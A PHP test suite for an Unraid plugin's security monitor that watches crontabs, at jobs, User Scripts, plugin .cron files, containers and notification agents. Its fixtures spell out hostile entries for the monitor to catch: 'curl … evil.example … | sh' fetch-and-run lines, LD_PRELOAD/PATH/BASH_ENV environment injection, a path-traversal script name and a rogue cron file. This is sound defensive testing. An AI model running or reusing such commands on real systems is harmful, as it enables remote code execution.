    same('watch page: what he keeps an eye on', [2, ['192.168.7.66', '203.0.113.9'], ['Media']],
        [count($page['watch']['ips']), $failing, array_column($page['watch']['shares']['open'], 'share')]);
    $m = watchmanMetrics($data);
    same('watch metrics: open per kind, the last round', ['uso_watchman_open_findings', count(WATCH_KINDS), 1, 'uso_watchman_last_round_timestamp_seconds', $now + 300 + 600 + WATCH_NOTIFY_QUIET],
        [$m[0]['name'], count($m[0]['samples']), array_column(array_map(fn ($s) => [$s[0]['kind'], $s[1]], $m[0]['samples']), 1, 0)['login_failures'], $m[1]['name'], $m[1]['samples'][0][1]]);

    // the switch (like the team lead's): off — nothing told, and what came meanwhile stays untold once it is on again
    $book2 = [watchmanEntry('flash_user', 'flash_user:zed', $now, ['user' => 'zed'])];
    $st2 = ['notify' => false];
    $before = count($calls());
    $t2 = watchmanNotifyDue($book2, $st2, $now + 99999, true, 'en');
    same('watch switch off: nothing told, the entry muted', [[], $before, true, null], [$t2, count($calls()), !empty($book2[0]['muted']), $book2[0]['told'] ?? null]);
    $st2['notify'] = true;
    $t2 = watchmanNotifyDue($book2, $st2, $now + 99999 + 60, true, 'en');
    same('watch switch on again: what came meanwhile stays untold', [[], $before], [$t2, count($calls())]);
    $book2[] = watchmanEntry('flash_user', 'flash_user:amy', $now, ['user' => 'amy']);
    $t2 = watchmanNotifyDue($book2, $st2, $now + 99999 + 120, true, 'en');
    same('watch switch on: what is new is told', [[['kind' => 'flash_user', 'n' => 1, 'sent' => true]], $before + 1], [$t2, count($calls())]);
    same('watch switch: on by default', true, watchmanPageState($data, $now + 5000, false)['notify']['on']);
    watchmanNotifySet(false, $data, false);
    same('watch switch: kept in his state, the page sees it', [false, false], [watchmanLoad($data)['state']['notify'] ?? null, watchmanPageState($data, $now + 5000, false)['notify']['on']]);
    watchmanNotifySet(true, $data, false);
    try {
        watchmanNotifySet('yes', $data, false);
        check('watch switch: only true or false', false);
    } catch (Problem $e) {
        same('watch switch: only true or false', 'bad_request', $e->key);
    }

    // hired anew: a new look at what is normal, what was open is closed
    $r = watchmanRound($paths, $data, 2000, $now + 9000, $docker, true, $acks);
    $d = watchmanLoad($data);
    same('watch: hired anew — taken over again, nothing open', [true, [], 2, 'baseline'],
        [$r['fresh'], $open(), count(array_filter($d['book'], fn ($e) => $e['kind'] === 'watch')), array_column($d['book'], null, 'kind')['login_failures']['by'] ?? null]);

    // the book keeps WATCH_BOOK_MAX entries, open ones first
    $book = [];
    foreach (range(1, WATCH_BOOK_MAX + 10) as $i) {
        $book[] = ['noted' => $now] + watchmanEntry('flash_user', "flash_user:u$i", $now, ['user' => "u$i"]);
    }
    $book[] = watchmanEntry('flash_go', 'flash_go', $now, []);
    $kept = watchmanPrune($book, $now + 60);
    same('watch book: capped, the open one kept', [WATCH_BOOK_MAX, 1], [count($kept), count(array_filter($kept, 'watchmanOpen'))]);
    same('watch book: noted ones go after their days', 1, count(watchmanPrune($book, $now + WATCH_BOOK_DAYS * 86400 + 1)));

    // every kind has its texts
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/watchman/lang/en.json'), true) ?: [];
    foreach (array_keys(WATCH_KINDS) as $kind) {
        foreach (["check.$kind", "check.{$kind}_how", "entry.$kind", "notify.$kind", "adopt.$kind"] as $k) {
            check("watchman: text $k", isset($en[$k]));
        }
    }
    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    @unlink(watchmanLockFile($data, 'book'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * What is gone (a container removed, a plugin uninstalled, a share deleted) leaves "What I keep an eye
 * on" at once — counted is what is there — but he still remembers it: one that comes back the same is quiet
 */
function testWatchmanGone(): void
{
    $now = 1791280000;
    $known = ['app' => ['tokens' => ['--privileged'], 'seen' => $now - 600], 'db' => ['tokens' => [], 'seen' => $now - 600]];
    $book = [];
    $added = watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []]], $book, $now);
    same('watch gone: a container removed — nothing to tell, still remembered', [[], true], [$added, isset($known['app'])]);
    $added = watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []], 'app' => ['image' => 'x', 'tokens' => ['--privileged']]], $book, $now + 600);
    same('watch gone: back with the same rights — quiet', [[], []], [$added, $book]);
    $added = watchmanContainersCompare($known, ['db' => ['image' => 'postgres', 'tokens' => []], 'app' => ['image' => 'x', 'tokens' => ['--privileged', '--network=host']]], $book, $now + 900);
    same('watch gone: back with more — told', ['container_host'], $added);

    $tmp = sys_get_temp_dir() . '/office-tests-gone-' . getmypid();
    @mkdir($tmp, 0700, true);
    $b = ['hired' => 1000, 'time' => 1000, 'ips' => [], 'fail_ips' => [], 'flash' => ['go' => null, 'extra' => [], 'users' => ['root'], 'pw' => [], 'keys' => []],
          'containers' => ['app' => ['tokens' => ['--privileged'], 'seen' => $now], 'db' => ['tokens' => ['-p 5432:5432/tcp'], 'seen' => $now], 'web' => ['tokens' => [], 'seen' => $now],
                           'Grafana' => ['tokens' => ['-p 3000:3000/tcp'], 'seen' => $now - 900], 'zz-test' => ['tokens' => ['--privileged'], 'seen' => $now - 900]],
          'plugins' => ['user.scripts' => ['source' => 'raw.githubusercontent.com/x', 'version' => '1', 'seen' => $now],
                        'vmbackup' => ['source' => 'raw.githubusercontent.com/y', 'version' => '2', 'seen' => $now - 900]],
          'shares' => ['Filme' => ['smb' => 2, 'nfs' => 0, 'seen' => $now], 'appdata' => ['smb' => 0, 'nfs' => 0, 'seen' => $now],
                       'zz-test' => ['smb' => 2, 'nfs' => 0, 'seen' => $now - 900]],
          'sched' => null];
    file_put_contents("$tmp/baseline.json", json_encode($b));
    file_put_contents("$tmp/seen.json", json_encode(['containers' => ['app' => [], 'db' => [], 'web' => []], 'plugins' => ['user.scripts' => []],
                                                     'shares' => ['Filme' => [], 'appdata' => []]]));
    $w = watchmanPageState($tmp, $now, false)['watch'];
    same('watch gone: counted and listed is what is there now', [3, ['app', 'db'], ['user.scripts'], 2, ['Filme']],
        [$w['containers']['count'], array_column($w['containers']['special'], 'name'), array_column($w['plugins'], 'name'), $w['shares']['count'],
         array_column($w['shares']['open'], 'share')]);
    @unlink("$tmp/seen.json");
    $w = watchmanPageState($tmp, $now, false)['watch'];
    same('watch gone: without the last round\'s look — his memory as it is', [5, 2, 3], [$w['containers']['count'], count($w['plugins']), $w['shares']['count']]);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * A User Script started «in the background» goes through atd (User Scripts' backgroundScript.sh:
 * echo startBackground.php "/tmp/user.scripts/tmpScripts/<name>/script" | at NOW -M): a plain line in
 * the book, noted by itself — only when the job is exactly that, for a script that exists, with an
 * environment that can't run something else. Anything else in the queue stays an at_job.
 */
function testWatchmanAtUserScript(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-atus-' . getmypid();
    $us = "$tmp/src/flash/user.scripts";
    foreach (['temporäre_rsyncs_4', 'CKW Batch 2026'] as $n) {
        @mkdir("$us/scripts/$n", 0700, true);
        file_put_contents("$us/scripts/$n/script", "#!/bin/bash\necho $n\n");
    }
    $head = fn (string $env = '') => "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nSHELL=/bin/bash; export SHELL\nPWD=/; export PWD\nHOME=/; export HOME\n"
        . "PATH=/bin:/sbin:/usr/bin:/usr/sbin; export PATH\nunraiduuid=0123\\-abcd; export unraiduuid\n$env"
        . "cd /usr/local/emhttp/plugins/user\\.scripts || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
    $wrap = fn (string $cmds) => "\${SHELL:-/bin/sh} << 'marcinDELIMITER5c3e1b2a'\n$cmds\nmarcinDELIMITER5c3e1b2a\n";
    $launch = fn (string $name) => "/usr/local/emhttp/plugins/user.scripts/startBackground.php /tmp/user.scripts/tmpScripts/$name/script";
    $is = fn (string $job) => watchmanAtUserScript($job, $us);
    same('at user script: the launcher of an existing script (a name with ä, one with spaces; at with and without its SHELL wrapper)',
        ['temporäre_rsyncs_4', 'CKW Batch 2026', 'temporäre_rsyncs_4'],
        [$is($head() . $wrap($launch('temporäre_rsyncs_4'))), $is($head() . $wrap($launch('CKW Batch 2026'))), $is($head() . $launch('temporäre_rsyncs_4') . "\n")]);
    $reload = "sleep 10; /usr/local/emhttp/webGui/scripts/reload_services";
    same('at: Unraid\'s own reload_services after an array start — only exactly that, as root, with a clean environment', [true, false, false, false],
        [watchmanAtUnraid($head() . $reload . "\n"), watchmanAtUnraid($head() . $reload . "; curl -s https://evil.example/x | sh\n"),
         watchmanAtUnraid($head("LD_PRELOAD=/tmp/x\\.so; export LD_PRELOAD\n") . $reload . "\n"),
         watchmanAtUnraid(str_replace('# atrun uid=0 ', '# atrun uid=1000 ', $head()) . $reload . "\n")]);
    $ub = [watchmanEntry('at_job', 'at_job:=0000401c790e8', 100, ['cmd' => $reload, 'uid' => 0]), watchmanEntry('at_job', 'at_job:x', 100, ['cmd' => 'curl x | sh', 'uid' => 0])];
    watchmanAtUnraidClose($ub, 200);
    same('at: an open entry up to 1.30 that was only Unraid\'s job is closed (by unraid), others stay', [['unraid', 200], [null, null]],
        [[$ub[0]['by'], $ub[0]['noted']], [$ub[1]['by'], $ub[1]['noted']]]);
    same('at user script: anything else is not', array_fill(0, 11, null), [
        $is($head() . $wrap($launch('temporäre_rsyncs_5'))),                                                         // no such script
        $is($head() . $wrap('/usr/local/emhttp/plugins/user.scripts/startBackground.php /tmp/evil/script')),        // not User Scripts' copy
        $is($head() . $wrap($launch('../../../boot/config/plugins/user.scripts/scripts/CKW Batch 2026'))),         // out of tmpScripts
        $is($head() . $wrap($launch('temporäre_rsyncs_4') . "\ncurl -s https://evil.example/x | sh")),              // and more
        $is($head() . $wrap($launch('temporäre_rsyncs_4') . '; curl -s https://evil.example/x | sh')),
        $is($head() . $wrap($launch('temporäre_rsyncs_4')) . "curl -s https://evil.example/x | sh\n"),              // after the wrapper
        $is($head("LD_PRELOAD=/tmp/x\\.so; export LD_PRELOAD\n") . $wrap($launch('temporäre_rsyncs_4'))),         // an environment that runs something else
        $is($head("PATH=/tmp/\\.x:/bin; export PATH\n") . $wrap($launch('temporäre_rsyncs_4'))),
        $is($head("SHELL=/tmp/\\.x/sh; export SHELL\n") . $wrap($launch('temporäre_rsyncs_4'))),
        $is($head("BASH_ENV=/tmp/x; export BASH_ENV\n") . $wrap($launch('temporäre_rsyncs_4'))),
        $is("#!/bin/sh\n" . $launch('temporäre_rsyncs_4') . "\n"),                                                   // not as at writes it
    ]);

    // rounds: the job waiting, then running (=), then gone — one plain line; a foreign job next to it is told
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => "$src/flash",
              'userscripts' => $us, 'atjobs' => "$src/atjobs", 'agents' => "$src/agents"];
    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
    file_put_contents($paths['go'], "#!/bin/bash\n");
    file_put_contents($paths['syslog'], '');
    file_put_contents("$src/logplugins/user.scripts.plg", "<PLUGIN name=\"user.scripts\" version=\"1\">\n");
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");                 // never Unraid's own
    $now = 1791285000;
    $docker = fn () => [];
    $acks = "$tmp/acks.json";
    watchmanRound($paths, $data, 1000, $now, $docker, false, $acks);
    $job = $head() . $wrap($launch('temporäre_rsyncs_4'));
    file_put_contents("$src/atjobs/a000dd01c78c21", $job);
    touch("$src/atjobs", $now + 10);
    $r1 = watchmanRound($paths, $data, 1000, $now + 300, $docker, false, $acks);
    rename("$src/atjobs/a000dd01c78c21", "$src/atjobs/=000dd01c78c21");
    file_put_contents("$src/atjobs/a000de01c78c40", $head() . $wrap('curl -s https://evil.example/x | sh'));
    touch("$src/atjobs", $now + 400);
    $r2 = watchmanRound($paths, $data, 1000, $now + 600, $docker, false, $acks);
    $book = watchmanLoad($data)['book'];
    $us1 = array_values(array_filter($book, fn ($e) => $e['kind'] === 'at_userscript'));
    same('at user script: one line, noted by itself, nothing to tell; the foreign job next to it is', [[], ['at_job'], 1, 'temporäre_rsyncs_4', 'auto', false,
        ['at_job' => 1], ['at_job']],
        [$r1['added'], $r2['added'], count($us1), $us1[0]['p']['name'] ?? null, $us1[0]['by'] ?? null, watchmanOpen($us1[0] ?? []),
         watchmanOpenCounts($book), array_column($r2['told'], 'kind')]);
    same('at user script: nothing for the team lead', ['at_job'], array_column(watchmanFindings($book), 'id'));
    $page = watchmanPageState($data, $now + 700, false);
    $row = array_values(array_filter($page['book'], fn ($e) => $e['kind'] === 'at_userscript'))[0] ?? [];
    same('at user script: on the page — the script, noted by itself', ['temporäre_rsyncs_4', false, 'auto', 'sched'],
        [$row['t']['name'] ?? null, $row['open'] ?? null, $row['by'] ?? null, $row['group'] ?? null]);
    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    @unlink(watchmanLockFile($data, 'book'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The night watchman's watch over what starts on its own: root's own crontab next to Unraid's (new
 * lines, lines in both, the office's own lines, programs gone, the syslog as evidence), the plugins'
 * .cron files, User Scripts, atd's queue, the notification agents — all on copies in a temporary folder.
 */
function testWatchmanSched(): void
{
    $now = strtotime('2026-10-06 12:00:00');
    // the pieces
    same('sched: job lines, normalised, without comments and settings', ['*/5 * * * * a b', '@daily c'],
        watchmanCronJobs("# x\nSHELL=/bin/sh\n*/5  *\t* * *  a   b\n\n@daily c\n"));
    $short = watchmanCronShort('*/10 * * * * curl -s -u admin:hunter2 https://hc-ping.com/0123456789abcdef0123456789abcdef?x=1 PASSWORD=geheim > /dev/null 2>&1');
    check('sched: a line shown without its secrets', str_starts_with($short, '*/10 * * * * curl') && str_contains($short, 'hc-ping.com')
        && !preg_match('/hunter2|0123456789abcdef|geheim|dev\/null/', $short), $short);
    same('sched: the plugins\' folders shortened', '0 1 * * * bash unraid-secretary-office/scripts/job.sh backup',
        watchmanCronShort('0 1 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1'));

    // a whole watch, on copies
    $tmp = sys_get_temp_dir() . '/office-tests-sched-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['crontabs', 'cron.d', 'flash/dynamix', 'flash/unraid-secretary-office', 'flash/user.scripts/scripts/Alt', 'flash/user.scripts/scripts/Plan',
              'flash/user.scripts/scripts/Aus', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => "$src/flash",
              'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents"];
    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
    file_put_contents($paths['go'], "#!/bin/bash\n");
    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
    file_put_contents($paths['syslog'], $line($now - 60, 'kernel: up'));
    $system = "# Generated system monitoring schedule:\n*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n\n"
            . "# Unraid Secretary Office - written by the office, change it there\n"
            . "0 1 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1\n"
            . "1 12 * * * /usr/local/emhttp/plugins/user.scripts/startCustom.php /boot/config/plugins/user.scripts/scripts/CKW Batch 2026/script > /dev/null 2>&1\n";
    file_put_contents("$src/cron.d/root", $system);
    $vmb = "# Job for VM Backup plugin default:\n58 3 * * 6 /usr/local/emhttp/plugins/dynamix/scripts/monitor run_backup default > /dev/null 2>&1\n";
    file_put_contents("$src/crontabs/root", $vmb);
    file_put_contents("$src/flash/dynamix/monitor.cron", "# Generated system monitoring schedule:\n*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n\n");
    file_put_contents("$src/flash/dynamix/old.cron", "0 4 * * * /usr/local/emhttp/plugins/dynamix/scripts/statuscheck &> /dev/null\n");
    file_put_contents("$src/flash/unraid-secretary-office/unraid-secretary-office.cron", "0 1 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1\n");
    foreach (['unraid-secretary-office', 'user.scripts', 'parity.check.tuning'] as $p) {
        file_put_contents("$src/logplugins/$p.plg", "<PLUGIN name=\"$p\" version=\"1\">\n");
    }
    foreach (['Alt' => 'echo alt', 'Plan' => 'echo plan', 'Aus' => 'echo aus'] as $n => $body) {
        file_put_contents("$src/flash/user.scripts/scripts/$n/script", "#!/bin/bash\n$body\n");
    }
    $sched = fn (array $s) => json_encode(array_combine(array_map(fn ($n) => "/boot/config/plugins/user.scripts/scripts/$n/script", array_keys($s)),
        array_map(fn ($n, $f) => ['script' => "/boot/config/plugins/user.scripts/scripts/$n/script", 'frequency' => str_contains($f, ' ') ? 'custom' : $f,
                                  'id' => "schedule$n", 'custom' => str_contains($f, ' ') ? $f : ''], array_keys($s), $s)));
    file_put_contents("$src/flash/user.scripts/schedule.json", $sched(['Alt' => '0 3 * * *', 'Plan' => 'daily', 'Aus' => 'weekly']));
    file_put_contents("$src/agents/Discord.sh", "#!/bin/bash\nWEBHOOK='https://discord.com/api/webhooks/1/old-token'\n");
    $ours = "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nPATH=/usr/bin; export PATH\ncd /root || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n"
          . "#!/bin/sh\n" . HOST_LAUNCH_MARK . "\nexec /bin/bash /usr/local/emhttp/plugins/unraid-secretary-office/backup/backup.sh </dev/null >/dev/null 2>&1\n";
    file_put_contents("$src/atjobs/a0000101c2b3a4", $ours);
    $notified = "$tmp/notified";
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
    chmod("$tmp/notify", 0755);
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
    $calls = fn () => array_values(array_filter(explode("\n", (string) @file_get_contents($notified))));
    $open = function () use ($data): array {
        $n = array_count_values(array_column(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'), 'kind'));
        ksort($n);
        return $n;
    };
    $docker = fn () => [];
    $acks = "$tmp/acks.json";

    $r = watchmanRound($paths, $data, 1000, $now, $docker, true, $acks);
    $b = watchmanLoad($data)['baseline']['sched'] ?? [];
    same('sched: taking over, all of it is normal', [true, [], [], 1, 3, 3, 0, 1],
        [$r['fresh'], $r['added'], $open(), count($b['crontab']['lines'] ?? []), count($b['files'] ?? []), count($b['scripts'] ?? []), count($b['at'] ?? []),
         count($b['agents'] ?? [])]);

    // the night: root's own crontab becomes a copy of Unraid's, with an old copy of the office's line, a new line, a gone program
    $t = $now + 500;
    file_put_contents($paths['syslog'], $line($t - 700, 'www[9]: /usr/local/emhttp/plugins/far/away.sh too early')
        . $line($t - 20, 'webgui: Unsuccessful login user hunter2.sh from 192.168.7.66')
        . $line($t - 10, "ool www[3899811]: /usr/local/emhttp/plugins/vmbackup/scripts/commands.sh 'update_user_script' 'default'")
        . $line($t, 'kernel: eth0: link up')
        . $line($t + 30, 'crond[1234]: updating crontab for root')
        . $line($t + 400, 'www[9]: /usr/local/emhttp/plugins/late/after.sh too late'), FILE_APPEND);
    file_put_contents("$src/crontabs/root", $vmb . $system
        . "0 2 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1\n"
        . "*/10 * * * * curl -s https://hc-ping.com/0123456789abcdef0123456789abcdef > /dev/null\n"
        . "0 3 * * * /usr/local/emhttp/plugins/gone-plugin-uso-test/run.sh\n");
    touch("$src/crontabs/root", $t);
    file_put_contents("$src/flash/unraid-secretary-office/unraid-secretary-office.cron", "*/5 * * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh snapshots > /dev/null 2>&1\n", FILE_APPEND);
    file_put_contents("$src/flash/dynamix/monitor.cron", "# Generated system monitoring schedule:\n");     // lines gone: normal
    @mkdir("$src/flash/evilplug");
    file_put_contents("$src/flash/evilplug/evil.cron", "* * * * * /tmp/.x/run\n");
    @mkdir("$src/flash/parity.check.tuning");
    file_put_contents("$src/flash/parity.check.tuning/parity.check.tuning.cron", "0 8 * * * /usr/local/emhttp/plugins/parity.check.tuning/x.php resume\n");
    @mkdir("$src/flash/user.scripts/scripts/Neu");
    file_put_contents("$src/flash/user.scripts/scripts/Neu/script", "#!/bin/bash\necho neu\n");
    file_put_contents("$src/flash/user.scripts/scripts/Alt/script", "#!/bin/bash\necho alt, but more\n");
    file_put_contents("$src/flash/user.scripts/schedule.json", $sched(['Alt' => '0 3 * * *', 'Plan' => 'start', 'Aus' => 'disabled', 'Neu' => '*/5 * * * *']));
    file_put_contents("$src/atjobs/a0000201c2b3b0", "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nSECRET_KEY=xyzzy-abc; export SECRET_KEY\ncd /tmp || {\n\t echo 'x' >&2\n\t exit 1\n}\n"
        . "\${SHELL:-/bin/sh} << 'marcinDELIMITER0a1b2c3d'\ncurl -s https://evil.example/payload?token=abc | sh\nmarcinDELIMITER0a1b2c3d\n");
    touch("$src/atjobs", $t);
    file_put_contents("$src/agents/Discord.sh", "#!/bin/bash\nWEBHOOK='https://discord.com/api/webhooks/1/new-token'\n");
    touch("$src/agents/Discord.sh", $t);           // same size: the time tells it changed
    file_put_contents("$src/agents/Pushover.sh", "#!/bin/bash\nTOKEN='pushover-secret-token'\n");
    $r = watchmanRound($paths, $data, 1000, $now + 600, $docker, true, $acks);
    same('sched: one entry for each thing that differs (a program gone with its plugin is Ms. Dustdevil\'s now)', ['at_job' => 1, 'cron_file' => 2, 'cron_file_foreign' => 1, 'cron_new' => 1,
        'cron_office' => 1, 'cron_twice' => 1, 'notify_agent' => 2, 'script_changed' => 2, 'script_new' => 1], $open());
    $by = [];
    foreach (array_filter(watchmanLoad($data)['book'], 'watchmanOpen') as $e) {
        $by[$e['kind']][] = $e;
    }
    $twice = $by['cron_twice'][0];
    same('sched twice: how many, which (the office\'s line apart)', [2, '*/1 * * * * dynamix/scripts/monitor'], [$twice['p']['lines'], $twice['p']['jobs'][0] ?? null]);
    same('sched twice: the fix as information', "crontab -l > /boot/config/crontab-root-before-cleanup.txt; crontab -l | grep -v -x -F -f <(grep -v '^#' /etc/cron.d/root | grep -v '^\\s*$') | crontab -",
        watchmanText($twice)['fix']);
    same('sched: the office\'s own lines called out (the copy and the old one)', ['0 1 * * * bash unraid-secretary-office/scripts/job.sh backup',
        '0 2 * * * bash unraid-secretary-office/scripts/job.sh backup'], $by['cron_office'][0]['p']['jobs']);
    same('sched: the new lines, a token left out', ['*/10 * * * * curl -s https://hc-ping.com/…', '0 3 * * * gone-plugin-uso-test/run.sh'], $by['cron_new'][0]['p']['jobs']);
    $ev = $twice['p']['evidence'] ?? [];
    same('sched evidence: the file\'s time, the lines around it that name a plugin or cron — no login, nothing far off',
        [$t, [date('H:i:s', $t - 10) . " ool www[3899811]: /usr/local/emhttp/plugins/vmbackup/scripts/commands.sh 'update_user_script' 'default'",
              date('H:i:s', $t + 30) . ' crond[1234]: updating crontab for root']], [$twice['p']['mtime'], $ev]);
    $files = array_column(array_map(fn ($e) => [$e['p']['file'], $e['p']], $by['cron_file']), 1, 0);
    same('sched .cron: the office\'s own file changed (plain), a plugin\'s new file (plain), one of no installed plugin (important)',
        [true, false, true, 1, 'evilplug/evil.cron', true],
        [$files['unraid-secretary-office/unraid-secretary-office.cron']['office'] ?? null, $files['unraid-secretary-office/unraid-secretary-office.cron']['new'] ?? null,
         $files['parity.check.tuning/parity.check.tuning.cron']['new'] ?? null, $files['unraid-secretary-office/unraid-secretary-office.cron']['lines'] ?? null,
         $by['cron_file_foreign'][0]['p']['file'], WATCH_KINDS['cron_file_foreign'][1]]);
    $scripts = array_column(array_map(fn ($e) => [$e['p']['name'], $e['p']], $by['script_changed']), 1, 0);
    same('sched scripts: new, changed content, a schedule now at the array\'s start; switched off is normal',
        ['Neu', '*/5 * * * *', true, ['start', 'daily', false], false],
        [$by['script_new'][0]['p']['name'], $by['script_new'][0]['p']['cron'], $scripts['Alt']['content'] ?? null,
         [$scripts['Plan']['cron'] ?? null, $scripts['Plan']['old'] ?? null, $scripts['Plan']['content'] ?? null], isset($scripts['Aus'])]);
    $at = $by['at_job'][0]['p'];
    same('sched at: only the foreign job, what it runs without its environment or token', ['a0000201c2b3b0', 'curl -s https://evil.example/… | sh', 0, hexdec('01c2b3b0') * 60],
        [$at['job'], $at['cmd'], $at['uid'], $at['when']]);
    same('sched agents: a new one, a changed one', [['Discord.sh' => false, 'Pushover.sh' => true]],
        [array_column(array_map(fn ($e) => [$e['p']['name'], $e['p']['new']], $by['notify_agent']), 1, 0)]);
    $all = '';
    foreach (glob("$data/*.json") ?: [] as $f) {
        $all .= file_get_contents($f);
    }
    check('sched: no secret in his files (tokens, the at job\'s environment, an agent\'s content)',
        !preg_match('/0123456789abcdef0123|xyzzy|SECRET_KEY|token=abc|new-token|old-token|pushover-secret|hunter2/', $all));
    $told = array_column($r['told'], 'kind');
    sort($told);
    same('sched: the important kinds go to Unraid\'s notifications', ['at_job', 'cron_file_foreign', 'cron_new', 'cron_office', 'cron_twice', 'notify_agent'], $told);

    // the same again: nothing new; then «I know, thanks» on everything — the new normal
    $r = watchmanRound($paths, $data, 1000, $now + 900, $docker, true, $acks);
    same('sched: seen again — nothing new', [], $r['added']);
    watchmanAck('*', $data, $now + 1000, false);
    $r = watchmanRound($paths, $data, 1000, $now + 1200, $docker, true, $acks);
    same('sched: noted — the same state reports nothing', [[], []], [$r['added'], $open()]);
    $b = watchmanLoad($data)['baseline']['sched'];
    same('sched: noted is normal (doubled lines, the office\'s line, the foreign .cron, the at job, the agent; no dead lines kept)', [2, 2, false, true, true, true],
        [count($b['crontab']['twice']), count($b['crontab']['office']), isset($b['crontab']['dead']),
         isset($b['files']['evilplug/evil.cron']), isset($b['at']['a0000201c2b3b0']), isset($b['agents']['Pushover.sh'])]);

    // cleaned up by hand — normal; doubled again later — told again
    file_put_contents("$src/crontabs/root", $vmb);
    touch("$src/crontabs/root", $now + 1300);
    $r = watchmanRound($paths, $data, 1000, $now + 1500, $docker, true, $acks);
    same('sched: the doubles removed — nothing to tell, no longer normal', [[], 0], [$r['added'], count(watchmanLoad($data)['baseline']['sched']['crontab']['twice'])]);
    file_put_contents("$src/crontabs/root", $vmb . $system);
    touch("$src/crontabs/root", $now + 1600);
    $r = watchmanRound($paths, $data, 1000, $now + 1800, $docker, true, $acks);
    same('sched: doubled again — told again', ['cron_office', 'cron_twice'], (function (array $a) { sort($a); return $a; })($r['added']));

    // the page: what he keeps an eye on, no internals
    $page = watchmanPageState($data, $now + 2000, false);
    same('sched page: root\'s lines, the .cron files, User Scripts, at, agents', [1, 5, 4, 1, ['Discord.sh', 'Pushover.sh']],
        [count($page['watch']['sched']['crontab']), count($page['watch']['sched']['files']), count($page['watch']['sched']['scripts']),
         $page['watch']['sched']['at'], $page['watch']['sched']['agents']]);
    check('sched page: no fingerprints', !str_contains(json_encode($page), '"_h"') && !str_contains(json_encode($page), '"_f"'));

    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    @unlink(watchmanLockFile($data, 'book'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The night watchman and the office's own doings: dcron's reload signal (cron.update) and stray text are no
 * crontab lines; what the consultant installed (his root-only record: a plugin, the cron.d file that came with
 * it, a container from the form he prepared) is noted by itself, never told — strictly that name, that image,
 * that time; anything else stays reported.
 */
function testWatchmanOffice(): void
{
    same('cron shape: only cron lines count (five time fields or an @keyword, then a command)',
        ['*/5 * * * * a', '@reboot b', '30 4 * * mon-fri c', '0 0 1 jan,jul * d', '0-59/15 1,13 * * 0 e'],
        watchmanCronJobs("root\nhello world this is a test of text\n* * * *\n*/5 * * * * a\n@reboot b\n30 4 * * mon-fri c\n0 0 1 jan,jul * d\n"
            . "0-59/15 1,13 * * 0 e\n@sometimes f\nMAILTO=root\n"));
    same('cron signal: an old false alarm about cron.update is left out of the book', [true, true, false],
        [watchmanCronSignalEntry(['kind' => 'cron_new', 'p' => ['lines' => 1, 'jobs' => ['cron.d/cron.update: root']]]),
